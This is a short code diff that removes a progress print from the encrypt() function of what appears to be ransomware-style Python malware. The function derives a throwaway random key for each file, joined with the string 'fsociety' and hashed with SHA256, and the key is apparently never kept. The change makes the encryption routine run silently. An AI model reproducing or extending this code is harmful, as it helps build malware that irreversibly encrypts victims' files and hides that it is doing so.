@@ -10,7 +10,6 @@ from string import ascii_letters, digits, punctuation
 
 def encrypt(root, filename):
     fn = root + '/' + filename
-    print('encrypting ' + fn)
     pw = 'fsociety'.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(4, 16)))) for x in range(SystemRandom().randint(8, 12)))
     hasher = SHA256.new(pw.encode('utf-8'))
     key = hasher.digest()
